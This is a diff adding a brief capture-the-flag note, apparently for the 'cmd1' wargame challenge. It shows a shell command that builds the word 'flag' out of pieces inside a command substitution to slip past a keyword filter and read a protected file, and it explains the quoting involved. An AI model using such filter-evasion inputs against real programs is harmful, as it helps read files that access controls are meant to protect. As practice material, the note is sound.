@@ -1,0 +1,9 @@
+./cmd1 '/bin/cat $(echo -n ./fl;echo -n ag)'
+
+instead of
+
+./cmd1 "/bin/cat $(echo -n ./fl;echo -n ag)"
+
+the latter, what's inside $() will be executed before passing into cmd1, which expands flag
+
+mommy now I get what PATH environment is for :)
